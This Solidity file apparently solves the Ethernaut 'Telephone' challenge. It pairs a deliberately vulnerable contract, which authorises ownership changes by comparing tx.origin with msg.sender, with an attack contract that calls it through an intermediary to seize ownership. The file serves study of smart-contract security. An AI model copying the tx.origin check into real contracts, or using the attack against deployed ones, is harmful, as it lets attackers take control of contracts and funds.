// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract attackTelephone {
    address payable public owner;
    Telephone telephone;

    constructor(Telephone _telephone) public {
        telephone = Telephone(_telephone);
        owner = payable(msg.sender);
    }

    function attack() public {
        telephone.changeOwner(owner);
    }
}